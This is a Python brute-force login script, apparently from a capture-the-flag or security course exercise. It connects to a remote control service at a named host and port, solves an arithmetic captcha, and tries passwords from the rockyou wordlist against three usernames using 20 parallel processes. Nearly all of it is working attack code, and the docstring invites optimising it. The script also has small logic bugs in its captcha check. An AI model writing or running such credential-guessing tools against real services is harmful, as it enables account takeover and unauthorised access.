"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import re
import time
import itertools
from multiprocessing import Pool
from random import shuffle
from functools import partial

host = "wattsamp.net" # IP address here
port = 1337 # Port here

if __name__ == '__main__':
    print("Loading wordlist...")

wordlist_uri = 'rockyou-a.txt' # Point to wordlist file
wordlist_file = open(wordlist_uri, "r", encoding="latin-1")
wordlist = []

for line in wordlist_file:
    wordlist.append(line.strip())

if __name__ == '__main__':
    print("Loaded " + str(len(wordlist)) + " words into wordlist")

usernames = ["ejnoman", "ejnorman84", "EricNorman84"]

captcha_regex = re.compile(r"^(\d+)\s([+\-*])\s(\d+)", flags=re.MULTILINE)

def brute_force(password):
    for username in usernames:
        possible_combos = open("possible_combos_" + username + " .txt", "a")

        matches = None

        while matches == None:
            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.setblocking(True)
            data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port
            #print(data)    # Prints data
            
            matches = captcha_regex.search(data)
        
        param_1 = int(matches.group(1))
        param_2 = int(matches.group(3))

        if matches.group(2) == "+":
            captcha_resp = param_1 + param_2
        elif matches.group(2) == "-":
            captcha_resp = param_1 - param_2
        elif matches.group(2) == "/":
            captcha_resp = param_1 / param_2
        elif matches.group(2) == "*":
            captcha_resp = param_1 * param_2
        else:
            #print("CAPTCHA FAIL ERROR")
            return

        #print("Solved: " + str(captcha_resp))
        s.send((str(captcha_resp) + "\n").encode())
        time.sleep(1)
        resp = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port'
        if not "Fail" in data: # we got the captcha right
            s.send((username + "\n").encode())
            time.sleep(1)
            s.recv(1024)
            time.sleep(1)
            s.send((password + "\n").encode())
            time.sleep(1)
            print("Trying " + username + " " + password + "...")
            login_resp = s.recv(1024).decode()
            if not "Fail" in login_resp:
                print("Login success!")
                possible_combos.write(username + " " + password + "\n")
        else: # we got it wrong?
            print("ERROR. Captcha was: " + data + " and we resonded with: " + captcha_resp)


if __name__ == '__main__':
    p = Pool(20)
    p.map(brute_force, wordlist)
    #print("Loading username, password combinations...")
    #crossproduct = list(itertools.product(usernames, wordlist))
    #print("Loaded " + str(len(crossproduct)) + " combinations")

    #ejnoman_brute = partial(brute_force, "ejnoman")
    #ejnoman_reg = re.compile(r"^@.{16}1$")

    #ejnorman84_brute = partial(brute_force, "ejnorman84")
    #ejnorman84_reg = re.compile(r"^p.{8}a$")

    #EricNorman84_brute = partial(brute_force, "EricNorman84")
    #EricNorman84_reg = re.compile(r"^h.{5}$")

    #print("Checking " + str(len(list(filter(lambda it: EricNorman84_reg.match(it), wordlist)))) + " passwords")
    #p.map(EricNorman84_brute, list(filter(lambda it: EricNorman84_reg.match(it), wordlist)))
